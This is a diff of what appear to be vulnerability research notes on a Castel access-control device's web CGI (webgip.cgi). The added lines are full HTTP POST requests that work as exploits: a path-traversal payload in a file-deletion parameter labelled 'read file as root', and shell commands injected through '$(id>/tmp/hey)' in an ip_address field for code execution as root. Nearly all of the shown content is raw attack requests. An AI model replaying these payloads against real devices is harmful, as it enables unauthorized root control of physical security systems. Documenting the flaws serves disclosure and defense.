@@ -90,7 +90,20 @@ protocol=2&page=35&mode=21&lang=en&bt=54&gid=&fichier_a_envoyer_type=&fichier_a_
 
 /usr/lighttpd/www/castel-cfg/cgi-bin/webgip.cgi (Compiled need to be reversed)
 
+### READ FILE AS ROOT ANOTHER VERSION ? ####
 
+POST /castel-cfg/cgi-bin/webgip.cgi HTTP/1.1
+Host: xx
+Cookie: SessId=1632815890; UserLogin=admin; user_lang=fr
+Content-Length: 556
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+protocol=2&page=35&mode=21&lang=&bt=45&gid=&fichier_a_envoyer_type=&fichier_a_telecharger_supprimer_type=2&fichier_a_envoyer_selection=&fichier_a_envoyer_nom=&fichier_a_telecharger_supprimer_audio=../../../../../../../../../tmp/hey&fichier_a_telecharger_supprimer_image=&fichier_a_telecharger_supprimer_certificat=&fichier_a_telecharger_supprimer_mib=&fichier_a_renommer_type=&fichier_a_renommer_audio=&fichier_a_renommer_image=&fichier_a_renommer_certificat=&fichier_a_renommer_mib=&fichier_nouveau_nom=&file_type=2&file_action=1&file_list=acceso_denegado.wav&file_name=
 
 #Code Exec (as root)
 
@@ -103,13 +116,27 @@ Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 146
 Connection: close
-Cookie: SessId=x; castel_mode_affichage=1; tree_menu=%2Cdhtmlgoodies_treeNode2%2Cdhtmlgoodies_treeNode3%2Cdhtmlgoodies_treeNode5%2Cdhtmlgoodies_treeNode13%2Cdhtmlgoodies_treeNode20%2C
-Upgrade-Insecure-Requests: 1
+Cookie: SessId=x; castel_mode_affichage=1; 
 
 lang=fr&affichage=1&page=36&onglet=1&gid=130816&mode=11&bt=1&validity_delay=3650&generation_mode=0&ip_address=$(id%20>/tmp/hey)&hostname=GIP406480
 
 
+#### CODE EXEC AS ROOT ANOTHER VERSION ? ####
 
+POST /castel-cfg/cgi-bin/webgip.cgi?lang=fr&affichage=1&gid=130816&page=36 HTTP/1.1
+Host: 192.168.69.119
+Cookie: SessId=xxx; UserLogin=admin; user_lang=fr
+Content-Length: 143
+Upgrade-Insecure-Requests: 1
+Origin: https://192.168.69.119
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+lang=fr&affichage=1&page=36&onglet=1&gid=130816&mode=11&bt=1&validity_delay=3650&generation_mode=0&ip_address=$(id>/tmp/hey)&hostname=XE2510adb
 
 #### Castel Suite  #####
 
